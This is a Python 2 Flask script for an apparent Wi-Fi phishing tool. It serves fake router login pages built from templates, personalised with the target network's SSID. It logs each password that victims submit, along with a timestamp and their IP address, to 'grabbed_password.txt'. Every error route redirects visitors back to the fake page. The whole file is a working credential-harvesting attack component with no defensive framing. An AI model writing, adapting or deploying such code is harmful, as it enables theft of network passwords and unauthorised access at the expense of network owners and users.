#!/usr/bin/env python
# -*- coding: utf-8 -*-

from flask import Flask, abort, request, redirect, send_from_directory, render_template
import json
import time
import traceback
import sys
import os

from templates import template_list
tl = template_list.template_list

############################################################

import argparse
parser = argparse.ArgumentParser(add_help=True, description='Simple webserver that uses the templates available in folder templates/')

parser.add_argument('-s', required=False, type=str, help="SSID:\tName of the target network")

requiredArgs = parser.add_argument_group('required arguments')
requiredArgs.add_argument('-a', required=True, type=str, help="ADDRESS:\tServer bind address (ex. 127.0.0.1 or 192.168.1.1)")
requiredArgs.add_argument('-p', required=True, type=int, help="PORT:\tServer bind port (ex. 80 or 8000 or 8080)")
requiredArgs.add_argument('-m', required=True, type=str, help="MODULE:\tChosen module (ex. en_generic_router)")

args = parser.parse_args()

if (args.a == None):
	print "[!] Argument -a ADDRESS can not be None"
	sys.exit(-1)

if (args.p == None):
	print "[!] Argument -p PORT can not be None"
	sys.exit(-1)

if (args.m == None):
	print "[!] Argument -m MODULE can not be None"
	sys.exit(-1)

if (tl.get(args.m) == None):
	print "[!] Module " + str(args.m) + " does not exists"
	sys.exit(-1)

############################################################

try:
	pid = str(os.getpid())
	f = open('/tmp/web_server.PID', 'w')
	f.write(pid)
	f.close()
except:
	pass

############################################################

VAR_HOST = str(args.a)
VAR_PORT = int(args.p)
MODULE = str(args.m)
SSID = args.s				# Can be None


VAR_SUBMIT_ENDPOINT = "/submit"
VAR_INDEX_ENDPOINT = "/index.html"
OUT_FILE = "grabbed_password.txt"

PATH_STATIC = "/static"

PATH_MODULES = "modules"
PATH_TEMPLATES = "templates"

########################################################################################################################

app = Flask(__name__, static_url_path=PATH_STATIC, template_folder=PATH_TEMPLATES)

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -	ROOT AND MAIN REQUESTS

@app.route('/', methods=['GET'])
def root_GET_responder ():
	return redirect(VAR_INDEX_ENDPOINT, code=302)

@app.route(VAR_INDEX_ENDPOINT, methods=['GET'])
def index_GET_responder():
	return render_template( tl[MODULE]['template'], module=tl[MODULE]['module'], ssid=SSID)

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -	MODULES STATIC FOLDER

@app.route('/' + PATH_MODULES + '/<path:path>', methods=['GET'])	# modules folder
def modules_GET_responder (path):
	return send_from_directory(PATH_MODULES, path)

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -	BACK-END REST

@app.route(VAR_SUBMIT_ENDPOINT, methods=['POST'])
def rest_POST_respond():
	try:
		password_1 = 	request.form.get('password_1')
		password_2 = 	request.form.get('password_2')
		now = 			time.strftime('%Y/%m/%d %H:%M')
		ip = 			""

		try: ip =		request.remote_addr
		except: pass

		out_string = 	now + " (" + ip + ") - " + password_1 + " - " + password_2 + "\n"

		f = open(OUT_FILE, 'a')
		f.write(out_string)
		f.close()

		return "ok"

	except Exception, e:
		return "error"

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -	ERROR HANDLING

@app.route('/empty', methods=['GET'])
def empty_GET_responder ():
	return ""

@app.errorhandler(404)
def page_not_found(e):
	# note that we set the 404 status explicitly
	# return render_template('404.html'), 404
	return redirect(VAR_INDEX_ENDPOINT, code=302)

@app.errorhandler(403)
def page_not_found(e):
	# note that we set the 403 status explicitly
	# return render_template('403.html'), 403
	return redirect(VAR_INDEX_ENDPOINT, code=302)

@app.errorhandler(410)
def page_not_found(e):
	# note that we set the 410 status explicitly
	# return render_template('410.html'), 410
	return redirect(VAR_INDEX_ENDPOINT, code=302)

@app.errorhandler(500)
def page_not_found(e):
	# note that we set the 500 status explicitly
	# return render_template('500.html'), 500
	return redirect(VAR_INDEX_ENDPOINT, code=302)

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -	APP RUN

# app.run(host=VAR_HOST, port=VAR_PORT, debug=True)
app.run(host=VAR_HOST, port=VAR_PORT)
# app.run(host=VAR_HOST, port=VAR_PORT, ssl_context='adhoc')

########################################################################################################################
